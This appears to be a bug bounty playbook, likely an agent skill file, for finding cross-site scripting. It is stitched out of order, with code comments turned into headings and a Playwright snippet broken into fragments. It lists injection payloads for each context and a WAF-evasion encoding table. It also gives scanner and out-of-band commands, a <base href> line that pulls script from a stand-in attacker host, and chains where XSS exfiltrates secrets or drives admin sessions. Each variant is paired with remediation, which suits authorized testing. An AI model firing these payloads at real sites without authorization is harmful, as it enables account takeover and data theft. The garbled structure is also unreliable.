- OWASP Top 10:2021 A03 Injection
- <variant-specific refs, e.g. DOMPurify advisory, Trusted Types docs>
```

## [Bugbountyskills.md] 6. Reference pointers

Read `references/variants-1.md` for variants 1-9 and `references/variants-2.md` for variants
10-18; read `references/payloads.md` when you need request templates, tool commands, or
WAF-evasion encodings. Do not improvise payloads from memory when the reference files have
a template for the context — the placeholders exist so you never paste a live target into
the playbook and never send the wrong context's payload.

## [Bugbountyskills.md] 1. Context-disambiguation flow: where is the input? → which payload family

Run this in order; stop at the first question you can answer from a probe:

```
Q0. Does the input come back at all (same request, later request, or only client-side)?
    ├─ same request            → V-02 family        → go Q1
    ├─ later request / stored  → V-04 (then V-05 if you can't see the render)
    ├─ never in a response, but flows in JS
    │                            → V-03 DOM family   → go Q6
    └─ only after a later visit/cache/other user → V-15, V-16

Q1. Where in the raw response bytes does the probe sit?
    ├─ between tags, plain text            → HTML text family        (§2.1)
    ├─ inside an attribute value           → go Q2
    ├─ inside <script> / a JS file region  → go Q3
    ├─ inside an event-handler attribute   → event-handler family    (§2.4)
    ├─ inside href/src/action/formaction   → URL/URI family          (§2.5)
    ├─ inside <title>/<textarea>/<style>/<comment> → close delimiter first (§2.1 note)
    ├─ inside VBScript context (legacy IE) → VBScript family         (§2.6)
    └─ HTML entities/Unicode survive raw   → V-12 (decode-order problem)

Q2. Attribute details:
    ├─ double-quoted  → "><breakout family     (§2.2)
    ├─ single-quoted  → '><breakout family     (§2.2)
    ├─ unquoted       → whitespace + handler   (§2.2)
    └─ URL-valued attribute (href/src/...)     → §2.5 + go Q5

Q3. JavaScript string context: which quoting?
    ├─ single-quoted   → '; breakout           (§2.3)
    ├─ double-quoted   → "; breakout           (§2.3)
    ├─ backtick/`      → ${} or ` breakout     (§2.3)
    ├─ numeric / bare expression → comma breakout (§2.3)
    └─ JSON embedded in <script> → break the script tag first: </script><zz>

Q4. (often parallel to Q1) Does a framework interpolate the value ({{ }}, ${})?
    └─ yes → V-08 CSTI family (§2.7), not an HTML breakout

Q5. Content-Type sane? (§2.5 URL payloads only fire if the response renders as HTML)
    ├─ text/html                         → proceed
    └─ wrong/missing type, no nosniff    → V-17 first, it may be the whole bug

Q6. Client-side only: source → sink?
    ├─ sink is innerHTML-family           → HTML/attribute payloads  (§2.1/§2.2)
    ├─ sink is eval/Function/timeout-str  → indirect-eval family     (§2.8)
    ├─ sink reads sanitizer output twice  → mXSS family              (§2.9)
    ├─ sink fed by polluted proto         → V-09: pollute + trigger, two steps
    └─ file/format rendered (SVG/MD/XML)  → V-14 family              (§2.10)
```

Rule of thumb: **the probe decides the family, not the URL.** `/search?x=` looks like a
text-context reflection until the probe shows it's an unquoted attribute.

---

## [Bugbountyskills.md] 2. Representative payload templates per context

### [Bugbountyskills.md] 2.1 HTML text context

```html
<zz<MARKER>>
</script><zz<MARKER>>                       <!-- if inside/near a script boundary -->
</title><zz<MARKER>></title>                 <!-- if inside <title> -->
</textarea><zz<MARKER>></textarea>           <!-- if inside <textarea> -->
</style><zz<MARKER>></style>                 <!-- if inside <style> -->
--><zz<MARKER>>                              <!-- if inside an HTML comment -->
```
Proof version: replace `<zz<MARKER>>` with `<img src=x onerror="<PROOF>">`.

### [Bugbountyskills.md] 2.2 Attribute context

```html
"><zz<MARKER>>
'><zz<MARKER>>
" autofocus onfocus="<PROOF>" x="          <!-- double-quoted, no '>' available -->
' autofocus onfocus='<PROOF>' x='          <!-- single-quoted -->
autofocus onfocus=<PROOF> x=               <!-- UNQUOTED: first space ends the value -->
" onmouseover="<PROOF>" data-x="          <!-- existing handler to piggyback on -->
```

### [Bugbountyskills.md] 2.3 JavaScript context (inside a `<script>` or JS file)

```javascript
';<PROOF>;//                                <!-- single-quoted string -->
";<PROOF>;//                                <!-- double-quoted string -->
</script><script><PROOF>()</script>         <!-- break out of the script tag itself -->
1;<PROOF>()                                 <!-- numeric / bare-expression slot -->
`;<PROOF>()                                 <!-- template literal -->
${'<PROOF>()'}                              <!-- inside an existing ${} interpolation -->
<!-- inside JSON-in-script: break the tag first (line above), never fight JSON escapes -->
```

### [Bugbountyskills.md] 2.4 Event-handler context

```html
" onerror="<PROOF>" x="                     <!-- img onerror pattern -->
" autofocus onfocus="<PROOF>" x="           <!-- needs focus, no navigation -->
" onmouseover="<PROOF>" x="                 <!-- click/hover required — note in report -->
"><svg onload="<PROOF>">                    <!-- load-time, no interaction -->
" onanimationstart="<PROOF>" style="animation:x
```
Report interaction honestly: `onerror`/`onload` = no click; `onmouseover`/`onfocus` = user
gesture. Severity differs.

### [Bugbountyskills.md] 2.5 URL / URI context (href, src, action, formaction, xlink:href)

```html
javascript:<PROOF>()                        <!-- <a href>: requires click; <iframe src>: auto -->
javascript://%0a<PROOF>()                   <!-- comment-trick for some filters -->
data:text/html,<zz<MARKER>>                 <!-- where data: in navigation isn't blocked -->
data:text/html;base64,<BASE64-OF-MARKUP>
```
Placeholders: base64 of an inert `<script><PROOF>()</script>` document only. Check the
target actually *navigates* to the URL (link vs. image src — `<img src="javascript:...">`
never fires).

### [Bugbountyskills.md] 2.6 VBScript context (legacy IE only)

```vbscript
msgbox "<PROOF>"                            <!-- only meaningful for pinned old-IE targets -->
```
Treat as a footnote unless scope names legacy IE; modern Chromium/Firefox parse nothing here.

### [Bugbountyskills.md] 2.7 Framework expression context (CSTI — V-08)

```text
{{7*7}}                                     <!-- detection probe: renders 49? -->
${7*7}                                      <!-- Vue 2 mustache probe -->
{{constructor.constructor('<PROOF>()')()}}   <!-- AngularJS constructor-chain family -->
{{constructor.constructor('return this')().x}} <!-- version-dependent gadget scaffold -->
```
Detection probes are inert arithmetic — escalate to the constructor-chain only after `49`
renders in the **live DOM**.

### [Bugbountyskills.md] 2.10 File/format vectors (V-14)

SVG (served `image/svg+xml`, fetched directly — not via `<img>`):
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="<PROOF>()"><text>zz</text></svg>
```
Markdown (raw HTML mode): `<img src=x onerror=<PROOF>>`
Markdown (safe-mode attribute smuggling): `![zz](x "onerror=<PROOF>")`
XML/XSLT: `<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" ...>` with `script` output — template skeleton only, fill after confirming XSLT is applied.

---

## [Bugbountyskills.md] 4. WAF-evasion encoding table

Take a working baseline payload `<BASE>` (e.g. `<img src=x onerror=alert(document.domain)>`)
and transform one technique per request. Re-test the full ladder only after Q1 of the
disambiguation flow is answered — encoding never fixes a wrong context.

| Technique | Example transform | Notes / gotchas |
|---|---|---|
| Single URL encoding | `%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E` | Baseline; any decoder does this once |
| **Double URL encoding** | `%253Cimg%2520src%253Dx...` | Only works if app decodes **twice** (server-side double-decode); browsers do NOT double-decode URLs — a hit must come from the server path, verify in DOM |
| HTML entity (hex) | `&#x3C;img src=x onerror=alert(1)&#x3E;` | Decoded when entity lands in HTML parse; must appear where parser decodes entities (text/attr), not in JS strings |
| HTML entity (decimal) | `&#60;img src=x onerror=alert(1)&#62;` | Same as above; mix bases to dodge single-signature rules |
| Nested / double entity | `&amp;lt;` → decodes once to `&lt;`, twice to `<` | Classic "WAF sees `&lt;`, app/browser sees `<`" mismatch |
| **Case mixing** | `<ImG sRc=x oNeRrOr=alert(1)>` | HTML tags/attrs are case-insensitive — cheap and still effective against lazy signatures |
| **Comment splitting** | `<scr<!--ipt>` , `onerror=/*x*/alert(1)` | HTML comment inside tag name gets stripped by parser; WAF regex misses `<script` |
| Tag-boundary whitespace | `<img%0asrc=x%0aonerror=alert(1)>` , `<img/src=x onerror=...>` | Newline/`/` accepted as separators by the HTML tokenizer |
| **Unicode escapes (JS context)** | `al\u0063ert(1)` , `\u{61}lert(1)` | Only where the string reaches a JS parser (script context, eval sink) — meaningless in HTML text |
| JSON unicode | `"\u003cimg ..."` inside embedded JSON | Decoded only if app JSON-decodes before render; often the sanitizer runs *before* this decode = your bypass ordering test |
| JS string concatenation | `al+'ert'(1)` style split forms | For keyword filters, not HTML filters; needs eval-ish context |
| Base64 / data URI | `data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==` | URL context only; `data:` blocked in many `frame-src`/navigate configs |
| **Unicode overlong UTF-8** | `%C0%BC` for `<` | ⚠ **Dead in modern browsers** (UTF-8 strict mode) — only cite for legacy/IE-pinned targets, don't waste ladder rungs on Chrome/Firefox |
| UTF-7 | `+ADw-script+AD4-` | ⚠ Legacy IE with `charset=utf-7` only; effectively extinct — footnote, not a finding |
| Null byte split | `%00`, `<scri%00pt>` | Legacy parsers only (old IE/IIS); note but don't rely on |
| Mixed-encoding chains | entity-inside-double-URL: `%2526%2523x3C%253B` | The real WAF-killer: two layers, each individually sanitized elsewhere; always verify the **final** DOM state |

Verification rule for every row: a bypass is only a bypass when **(a)** the WAF/naive
baseline was blocked in the same session, **(b)** the response contains your raw (or
decodable) markup, and **(c)** a real browser renders it as active markup. Two out of three
is a lead.

---

## [Bugbountyskills.md] dalfox — parameter scanning from a URL list (pipe mode)

cat params.txt | dalfox pipe --silent \
  --header 'Cookie: <SESSION_COOKIE>' \
  --worker 30 --timeout 10 --format json > dalfox.json

## [Bugbountyskills.md] dalfox — one high-value URL with custom proof payload

dalfox url 'https://<TARGET>/<PATH>?<PARAM>=<SEED>' \
  --payload '<img src=x onerror=alert(document.domain)>' \
  --blind '<OOB_DOMAIN>' --skip-bav --mining-dict

## [Bugbountyskills.md] Confirm execution in a real browser (headless chromium marker check)

chromium --headless --disable-gpu --virtual-time-budget=5000 \
  --dump-dom 'https://<TARGET>/<PATH>?<PARAM>=<PAYLOAD>' 2>&1 | grep -c 'zzprobe'

## [Bugbountyskills.md] Playwright (python) full login+sweep harness — two self-interference traps that

## [Bugbountyskills.md] masquerade as app behavior (learned on Outlaw 2026-10-23):

## [Bugbountyskills.md] party 403s the preflight, and Firebase login dies with

## [Bugbountyskills.md] auth/network-request-failed that looks like a network/app bug but is yours.

ctx.route('**/*', lambda r: r.continue_(
    headers={**r.request.headers, 'X-Inspectiv-Tester': H}
    if 'inscope.host' in r.request.url
    else {k: v for k, v in r.request.headers.items()
          if k.lower() != 'x-inspectiv-tester'}))

## [Bugbountyskills.md] 2) Cached browser build may lag the playwright package (chromium-1234 vs 1248):

## [Bugbountyskills.md] Always assert login actually succeeded (page.url + a known post-login heading)

## [Bugbountyskills.md] the login page, so a failed login tests the login view, not your routes.

## [Bugbountyskills.md] Collaborator-style OOB watch (blind, V-05) — interactsh example

interactsh-client -v | grep -E 'i=<UNIQ>'
```

Differential testing beats raw volume: run the naive baseline first, then the encoded
ladder, and only escalate payloads that the baseline proves are being *filtered* (see §4).

---

## [Bugbountyskills.md] 6. Chain it with (the suite)

| Chain | Direction | When / how |
|---|---|---|
| **`csrf-testing`** | XSS → CSRF | XSS largely *replaces* CSRF (same-origin JS can act as the victim) — but where reading a token needs it: use XSS to `fetch()` the token from a form page, then submit. Also covers the reverse: a CSRF that *plants* the stored XSS payload (CSRF → stored XSS, e.g. CSRF-able comment form with HTML allowed). Report as an XSS finding with CSRF as the delivery note; dedupe against a pure-CSRF report of the same form. |
| **`path-traversal-testing`** | LFI/RFI → XSS | Log poisoning → include attacker-controlled log lines in an HTML page (`<?php echo ... ?>` variants for RCE side, plain HTML for XSS); traversal that reads a reflected-parameter file into the page (LFI-to-XSS); RFI loading a remote script into an inline include context. Also the reverse: XSS exfiltrating traversal-found secrets (`/proc/self/environ` in a client-side previewer). See `path-traversal-testing` for wrapper/encoding detail. |
| **`business-logic-testing`** | XSS → logic abuse | Blind XSS (V-05) in an admin browser as the *actuator* for a logic flaw: force the admin's session to approve/escalate/bypass a workflow step the attacker can't reach; XSS-driven automation of an OTP/price-step the victim legitimately has access to; scripted replay of an under-validated workflow with the victim's cookies. Severity = logic-flaw impact + XSS delivery. |
| `sqli-testing` | SQLi → XSS | Error/union channels that reflect into HTML; stacked writes that plant stored XSS in content tables. |
| `info-disclosure-testing` | Info leak → XSS | Leaked JS source/sourcemaps reveal client sinks & gadgets (V-03/V-09 recon); leaked sanitizer versions → known mXSS bypasses (V-07). |
| `rce-testing` / `ssrf-testing` | SSTI/SSTI-adjacent | Server-side `{{7*7}}` = SSTI not CSTI (see V-08 false positives) — route it to `rce-testing`; SSRF-to-local-preview-service can render your HTML → `ssrf-testing`. |
| `sandbox-escape-testing` | Sandbox chain | DOM clobbering / TT policy injection (V-18) meeting a JS sandbox; use when the sink sits behind an in-app sandbox rather than the browser origin. |
| `bac-idor-testing` | Access control + XSS | Confirming *who else* can view the stored/blind payload field (admin-only render path) usually needs IDOR/BAC techniques to enumerate. |

Primary working chains in practice: **XSS → CSRF** (same form, different claim),
**path traversal → XSS** (poisoned include), and **XSS → business logic** (admin-browser
actuator) — the three named above are the ones most reports will actually need.

## [Bugbountyskills.md] Table of contents

- [V-01: Multi-transport parameter reflection (POST/GET XSS matrix)](#v-01-multi-transport-parameter-reflection-postget-xss-matrix)
- [V-02: Immediate context reflection boundary evasion (RXSS)](#v-02-immediate-context-reflection-boundary-evasion-rxss)
- [V-03: Client-side sink exploitation (DOM-based XSS source analysis)](#v-03-client-side-sink-exploitation-dom-based-xss-source-analysis)
- [V-04: Persistent storage script injection (stored XSS architecture)](#v-04-persistent-storage-script-injection-stored-xss-architecture)
- [V-05: Out-of-band testing (blind XSS tracking engines)](#v-05-out-of-band-testing-blind-xss-tracking-engines)
- [V-06: Browser SOP defiance (universal XSS / UXSS)](#v-06-browser-sop-defiance-universal-xss-uxss)
- [V-07: Parsing misalignment (mutation XSS / mXSS vs DOMPurify)](#v-07-parsing-misalignment-mutation-xss-dompurify-mxss)
- [V-08: Framework expression sandbox evasion (CSTI — AngularJS / Vue)](#v-08-framework-expression-sandbox-evasion-csti--angularjs--vue)
- [V-09: DOM XSS-assisted prototype pollution exploitation](#v-09-dom-xss-assisted-prototype-pollution-exploitation)

---

## [Bugbountyskills.md] full proof payloads per context: payloads.md §2 — swap in the marker the ladder selected

```

**Confirm:** two signals — raw response shows breakout bytes unencoded at the identified position, AND a real browser renders the injected node and fires the inert proof.

**False positives:** reflection inside a JSON/JS string where `<` is `\u003c` (grep-inert, browser-inert); quotes backslash-escaped by `JSON.stringify` so the string never closes; reflection inside a `<template>` the parser doesn't render; your own marker cached from an earlier test. **A pasted report's claimed context is a historical observation, not ground truth** — a report saying "unquoted attribute" may now render quoted *and* entity-encoded because a patch landed after submission (2026-10-24: frontier.com `asn` payload `x autofocus onfocus=…` fully inert; `value="…"` with `<`→`&lt;` `"`→`&quot;` — same result from curl, content-negotiation variants, multipart, valid-data flow, and a real browser). **Run the baseline+marker retest of the REPORTED endpoint first, before crawling for "the same bug elsewhere"** — if the original no longer reproduces, the whole same-class hunt on that host may rest on a stale premise, and the report you were extending is (patched | false positive); get the original raw bytes to tell which.

**Impact:** "attacker-crafted URL runs arbitrary JS in victims' sessions on <origin>" — self-service reflected bug with no privileged audience is Medium unless it exposes auth-gated functionality (password change, token display), then higher.

**Remediation:** context-aware auto-escaping at the template layer — HTML body, attribute, JS, and URL encoding are four different functions, not one.

**CWE / OWASP:** CWE-79 / OWASP A03:2021 Injection.

---

## [Bugbountyskills.md] Mutation = executable node present after round-trip, absent before.

```

**Confirm:** the injected handler executes in the real render path (clean fetch, browser console marker), and the differential holds: pre-sanitizer string inert, post-round-trip string active.

**False positives:** payload that executes only when pasted straight into a console (you bypassed the app); mutation requiring a browser the audience doesn't run (IE-only backtick serialization — check real user agents); output shown in a `<pre>` (string never re-parsed = inert — verify the sink assigns `innerHTML`).

**Impact:** sanitizer bypass = High/Critical wherever the field is visible, because teams treat sanitizer presence as the whole defense — name the exact version and the triggering round-trip.

**Remediation:** upgrade the sanitizer, serialize once (sanitize the final DOM, not intermediate strings), and use a strict tag/attribute allowlist that excludes namespace-switching elements.

**CWE / OWASP:** CWE-79 / OWASP A03:2021 Injection (also CWE-183 Permissive Allowlist).

---

## [Bugbountyskills.md] V-08: Framework expression sandbox evasion (CSTI — AngularJS / Vue / Svelte)

**Mechanism:** Client-side frameworks compile templates and *evaluate expressions* in the page's JS context. If attacker input lands inside a template that later compiles (`{{...}}`, directives, interpolation), your string becomes code — in AngularJS, through a sandboxed expression evaluator with a long history of escapes. The violated assumption: "templates are developer-authored"; any string interpolated before compile is code.

**Preconditions:**
- Detectable framework: `ng-app`, angular/vue/svelte in bundle, visible double `{{ }}`.
- Input interpolated into the template *before/as* it compiles (server-injected values, `v-html`/`ng-bind-html` areas).
- AngularJS: a version with a published sandbox bypass (most ≤1.8.x).

**Detect:**
1. Fingerprint: view-source for `angular.js`/`vue.runtime` + version; `ng-app`; `__VUE__` hooks; `${{ }}` double-parsing artifacts.
2. Send inert arithmetic: `{{7*7}}`, `${7*7}`, `#{7*7}`, `<%= 7*7 %>`. `49` in the **live DOM** = client-side evaluation; `49` only in raw HTML = server-side engine → that's SSTI, go to `rce-testing`.
3. If `49` renders client-side, escalate to a marker payload (`payloads.md` §2.7): AngularJS constructor-chain or Vue instance gadget.
4. Confirm the compile path: breakpoint on `$compile`/`Vue.$mount`, or verify your string reached template source before rendering.

**Proof of concept:**
```http
GET /page?name={{7*7}}                                 ← detection: renders 49?
GET /page?name={{constructor.constructor('<PROOF>()')()}}   ← AngularJS family (version-adjust)
```

**Confirm:** `49` renders in the live DOM (raw echo is not evaluation) AND a constructor-chain proof fires with the inert marker — two signals proving compile-time evaluation.

**False positives:** server-side engines echoing the syntax (raw-vs-DOM check; SSTI is a different skill/severity); Vue 3 has no template sandbox — failing `${{ }}` doesn't rule Vue out, test `v-html` paths; CSP without `unsafe-eval` kills AngularJS gadgets — report the CSP as mitigation, don't overclaim RCE.

**Impact:** template injection grants arbitrary JS in victim sessions and signals an EOL/weak frontend posture (classic: pinned AngularJS 1.x) — High on an auth-sensitive origin.

**Remediation:** never interpolate untrusted input before compile — use framework property binding with default escaping; move off EOL AngularJS and drop `unsafe-eval` from CSP.

**CWE / OWASP:** CWE-94 (Code Injection) / CWE-79 / OWASP A03:2021 Injection.

---

## [Bugbountyskills.md] Table of contents

- [V-10: Cross-context resiliency (universal polyglot XSS payloads)](#v-10-cross-context-resiliency-universal-polyglot-xss-payloads)
- [V-11: Non-alphanumeric execution (JJEncode / AAEncode / JSFuck)](#v-11-non-alphanumeric-execution-jjencode--aaencode--jsfuck)
- [V-12: Double encoding obfuscation (WAF evasion: URL / HTML entity / Unicode)](#v-12-double-encoding-obfuscation-waf-evasion-url--html-entity--unicode)
- [V-13: Indirect string evaluation sinks (bypassing sanitized primitive paths)](#v-13-indirect-string-evaluation-sinks-bypassing-sanitized-primitive-paths)
- [V-14: Vector insertion via file formats (SVG / PDF / Markdown / XML)](#v-14-vector-insertion-via-file-formats-svg--pdf--markdown--xml)
- [V-15: Second-order reflected XSS via client-side cache injection](#v-15-second-order-reflected-xss-via-client-side-cache-injection)
- [V-16: Relative path overwrite (RPO) context confusion](#v-16-relative-path-overwrite-rpo-context-confusion)
- [V-17: MIME-sniffing assisted XSS (Content-Type misconfigurations)](#v-17-mime-sniffing-assisted-xss-content-type-misconfigurations)
- [V-18: Breaking Trusted Types via unsanitized policy injection sinks](#v-18-breaking-trusted-types-via-unsanitized-policy-injection-sinks)

---

## [Bugbountyskills.md] V-11: Non-alphanumeric execution (JJEncode / AAEncode / JSFuck)

**Mechanism:** JavaScript runs without keywords — JSFuck (`[]()!+` only), JJEncode (dot-mangled), AAEncode (full-width/dotted), or escapes inside identifiers (`al\u0063ert`). Blocklists and WAF signatures keyed on `alert`/`script`/`onerror` fail because semantics only appear after the encoding layer is decoded by `eval`/`Function`. The violated assumption: "we blocklisted dangerous words" — words were never required.

**Preconditions:**
- A string-to-code sink somewhere in the path: `eval`, `Function`, string-`setTimeout`, `$.globalEval`, or an allowed `<script>`/`srcdoc` slot (V-13).
- OR a script-inclusion slot where an encoded blob can be hosted (self-hosted `<script src>` for blind XSS).
- Body-size headroom: JSFuck explodes in size (KBs → MBs for trivial code).

**Detect:**
1. Send a naive keyword payload; if blocked, climb the ladder: `al\u0063ert(1)` → `al'+'ert(1)` → symbol-only encoding — at each rung check both WAF status and unmodified reflection.
2. Find the eval-shaped sink first (V-13) — encoded payloads with no sink are dead letters.
3. Measure size limits: WAF/body caps truncate mid-payload, and silent truncation looks like a miss.
4. Prefer `\u`-escape or concatenation forms in reports; keep full JSFuck as the "if you must" rung.

**Proof of concept:**
```http
POST /api/run            {"expr":"<ESCAPED-ENCODING-OF: alert(document.domain)>"}
GET  /app#<JS-CONTEXT-ESCAPED-FORM>     # when location.hash feeds an eval sink
```

**Confirm:** browser executes the decoded logic (marker fires) AND the differential: naive form blocked in the same session while the encoded form passes — proving the encoding was load-bearing.

**False positives:** encoding that only runs on a page *you* built to eval it (self-XSS); `\u` escapes inside an ordinary JS *string* that never reaches a code-eval path (inert); size-truncated payloads that merely corrupt the response (no execution); AAEncode pasted as plain HTML text (never decoded — no sink).

**Impact:** a filter/WAF bypass primitive: "execution achieved despite keyword filtering on the expression field" — severity follows the underlying sink, not the encoding.

**Remediation:** drop token blocklists; encode output per context and remove string-to-code sinks — the encoding layer was only the symptom.

**CWE / OWASP:** CWE-79 / CWE-94 / OWASP A03:2021 Injection.

---

## [Bugbountyskills.md] V-12: Double encoding obfuscation (WAF evasion: URL / HTML entity / Unicode)

**Mechanism:** Security layers decode a different number of times than the app. Double URL encoding (`%253C` → `%3C` → `<`), HTML entities (`&#x3C;`), nested entities (`&amp;lt;` decoded twice at two layers), overlong UTF-8, case mixing (`<ScRiPt>`), and comment splitting (`<scr<!--ipt>`) each exploit a decode-order mismatch between WAF matcher and app/browser parser. The violated assumption: "the WAF inspected this content" — it inspected different bytes than the browser eventually parses.

**Preconditions:**
- A WAF/filter matching on raw or once-decoded stream.
- The app (or a downstream layer: proxy, CDN, framework) decodes *again* before rendering, or the *browser* performs a decode the WAF assumed was last.
- Character-set ambiguity (legacy `%u003c`-style servers).

**Detect:**
1. Baseline: naive payload → expect WAF block (403 or block-page).
2. Re-encode one technique per request (`payloads.md` §4): single → double URL → entity → mixed case → comment-split → JS Unicode escape → nested combos (entity-inside-URL).
3. Classify each response: **blocked** (control working) / **passed but sanitized** (decoded and cleaned — not yet a bypass) / **passed and reflected raw** (candidate → confirm).
4. Confirm end-state in a browser: load the candidate, inspect the DOM for active markup. Reflected-as-`%3C` that the browser never decodes is inert — modern browsers do *not* double-decode URL sequences; double-decode landings are server-side and form-body paths.
5. For entities: verify decode ordering — entity surviving to the DOM as literal text is safe; entity decoded *after* the sanitizer is your bypass.

**Proof of concept:**
```bash
curl -s -o /dev/null -w '%{http_code}\n' 'https://<TARGET>/s?q=<script>alert(1)</script>'   # naive: blocked
curl -s 'https://<TARGET>/s?q=%253Cscript%253Ealert(1)%253C%252Fscript%253E' | grep -o '<script>.*</script>'
```

**Confirm:** rendered DOM contains the active element in a real browser, with the naive equivalent WAF-blocked in the same session — differential WAF behavior + browser-side execution.

**False positives:** WAF 403 is the control *working* (never report a block as a finding); app decodes twice but sanitizes after the second decode (safe by design — check ordering); double-encoded bytes reflected literally as text (browser shows `%3C` — inert); overlong UTF-8 / UTF-7 claimed against modern browsers (both dead: strict UTF-8 everywhere, UTF-7 gone — legacy/IE targets only).

**Impact:** "WAF bypass enabling XSS" is a combined finding — the executing XSS is the core issue, the evasion is the severity multiplier; rules need updating even after input encoding is fixed.

**Remediation:** decode exactly once at the boundary, sanitize the decoded form, output-encode at render; WAF rules must match the same normalized form the app renders.

**CWE / OWASP:** CWE-79 with CWE-116 (Improper Encoding) / OWASP A03:2021 Injection.

---

## [Bugbountyskills.md] V-14: Vector insertion via file formats (SVG / PDF / Markdown / XML)

**Mechanism:** Script lives inside a document format the app stores, converts, or renders inline: SVG (`<script>`, `onload` on `<svg>`/`<animate>`/`<set>`, `foreignObject` HTML), Markdown rendered to unsanitized HTML, XML/XSLT stylesheets, PDF JavaScript (`/OpenAction` — viewer-interpreted). The violated assumption: "it's an image/document, not a page" — SVG and XML *are* HTML-family documents and run script when served with a script-capable Content-Type.

**Preconditions:**
- Upload/preview/export endpoint accepting one of these formats (or URL→PDF / Markdown preview fetching attacker content).
- Served script-capable: `image/svg+xml` inline, `text/html` preview, `application/xhtml+xml` — not `Content-Disposition: attachment`.
- Stored and later fetched by you (self-proof) or another user (stored impact).

**Detect:**
1. Enumerate: uploads, "preview"/"render"/"export PDF" actions, Markdown fields, avatar/image fields accepting SVG, XML import/export, `?xsl=` params.
2. Upload a marker SVG; fetch the stored URL and record `Content-Type`, `Content-Disposition`, `X-Content-Type-Options`.
3. Test the serving modes separately: inline in app page (executes), direct navigation to `image/svg+xml` (executes — usually same app origin), `<img src>` or CSS background (inert — gotcha, don't overclaim).
4. Markdown: send raw `<img src=x onerror=...>` and attribute-smuggling `![zz](x "onerror=...")`; check output allowlist vs. strip.
5. PDF: `/OpenAction` proof — but PDF JS runs in the *viewer sandbox*, not the origin; verify real capability before claiming session impact.

**Proof of concept:**
```http
POST /api/upload           Content-Type: image/svg+xml; filename="p.svg"
<svg xmlns="http://www.w3.org/2000/svg" onload="<PROOF>()"><text>zz</text></svg>
GET  /uploads/<FILE_ID>.svg    ← must render + execute in browser
```

**Confirm:** direct fetch of the stored file executes the proof (DOM/console signal) with the recorded Content-Type — plus a second signal that another account's view triggers it (stored impact).

**False positives:** SVG viewed via `<img>` or CSS background (scripts inert — #1 FP here); `attachment` downloads (no render); PDF JS "executing" in a viewer with JS disabled (check your viewer); Markdown raw in API but HTML-encoded on render (test the render); execution on a *different* origin than the app (real XSS, but name that origin — impact follows it).

**Impact:** name the exact executing origin and audience: "stored SVG served `image/svg+xml` from app origin executes JS in any visitor's session" (High) vs. "PDF viewer script confined to viewer sandbox" (Low/info).

**Remediation:** serve user documents as `attachment` or from an isolated origin with `application/octet-stream` + `nosniff`; allowlist-sanitize SVG/Markdown; sandbox previews in a null-origin iframe.

**CWE / OWASP:** CWE-79 / OWASP A03:2021 Injection (CWE-434 Unrestricted Upload for the file-vector variants).

---

## [Bugbountyskills.md] V-16: Relative path overwrite (RPO) context confusion

**Mechanism:** The page uses *relative* subresource refs (`<script src="assets/app.js">`, `<link href="styles.css">`, CSS `url(...)`). The attacker controls a path variant (extra segment, trailing slash, encoded dots, `<base>` injection) so the browser resolves those refs to an attacker-influenced path — attacker-uploaded content, or a JSON/HTML response reinterpreted as JS — executing in the page's origin. RPO-gadget flavor: the app's *own* JS, now loaded from a wrong (same-code) path, reads attacker data through `location`-reading gadgets. The violated assumption: "the document URL is fixed" — path shape is attacker-influenceable and resolution is the browser's job.

**Preconditions:**
- Victim page references subresources relatively (no leading `/` — check view-source).
- Attacker can influence resolution: `/seg/`, trailing slash, `/%2e%2e/`, `..;/`, `?`/`#` — OR inject `<base href>` (needs partial HTML injection, typically an unescaped attribute) — AND a content channel at the resolved path (upload, JSON echo, any same-origin response the browser parses as script/style).
- No strict nonce/hash `script-src` CSP (hashes/nonces largely kill RPO — check first).

**Detect:**
1. List every relative ref (scripts, stylesheets, CSS `url()`, favicon) and note directory- vs. page-relative resolution.
2. Try path variants on the page URL and watch resolution in DevTools Network: `/a/b` → `/a/b/x/` → `/a/b/%2e%2e/x/` → `/a/b/..;/x/` — the relative refs should normally 404; a 200 with attacker-influenced content is the opening.
3. Look for an existing `<base>` tag or an attribute where one can be injected (`"` breakout near `<head>`).
4. Find the content channel: which same-origin endpoint returns attacker bytes at the path the relative ref would resolve to (uploads classic; JSON echo works if sniffable — V-17).
5. Check CSP: nonce/`sha256` kills classic RPO; bare `default-src` does not.

**Proof of concept:**
```text
1. GET /a/b            → page contains: <script src="assets/app.js">
2. Place attacker content at the resolved path (POST/upload at /a/b/assets/app.js or variant)
3. Send victim: GET /a/b/<PATH-VARIANT>/   (so "assets/app.js" resolves to attacker content)
4. Network shows script fetched from attacker-controlled path → executes in page origin
```
`<base>` variant: inject `<base href="https://<ATTACKER>/">` → all relative refs load cross-origin (script source host doesn't matter; it executes in the page's origin).

**Confirm:** Network shows the subresource fetched from the attacker-controlled path AND execution proof in the page origin — differential: the clean path loads the legitimate resource (or safe 404), proving path confusion is the trigger.

**False positives:** 404 on the resolved path (nothing executes — not a finding alone); same-origin script you can't influence (needs a real content channel); `<base>` injected where the parser escapes it (check the DOM, not the response string); CSS `url()` confusion only = exfil/trace issue, not XSS; CDN normalizing `..` before browser resolution (verify in Network, not curl).

**Impact:** "attacker-controlled script executes in app origin via the app's own relative-path handling" — High; also note it bypasses path-based filters and input encoding, because the payload isn't in the input — it's in the *resolution*.

**Remediation:** absolute paths (`/assets/app.js`) everywhere, avoid `<base>`, CSP `script-src` with nonces/hashes, uploads served from an isolated origin.

**CWE / OWASP:** CWE-79 / CWE-16 (Configuration) / OWASP A03:2021 Injection.

---

## [Bugbountyskills.md] 2. Engagement workflow

1. **Baseline capture (one clean page load).** Fetch the target with a browser-like session
   and record: full response headers, `Set-Cookie` shapes, every JS request, storage writes
   (localStorage/sessionStorage/IndexedDB), and any `postMessage` traffic. *Why:* every
   later fingerprint is a differential against this baseline; without it you cannot tell a
   framework signal from a one-off CDN header.
2. **Edge & origin mapping.** Identify CDN/WAF in front (Cloudflare/Akamai/F5/Imperva/
   CloudFront/azure) from header chains and TLS/`Server` tells, then test whether any path
   reaches origin without the edge (historical DNS, email subdomains, direct-IP with Host
   header — only where in scope). *Why:* the edge decides which requests get inspected;
   WAF-bypass hypotheses and cache-poisoning tests both depend on knowing where the
   boundary is.
3. **Client-side inventory.** Framework/runtime (`__NEXT_DATA__`, `ng-version`, `_nuxt`,
   `__sveltekit_`), bundler and sourcemaps, jQuery/helper library versions, storage key
   names, message handlers, feature-flag/endpoints embedded in bundles, CSP shape.
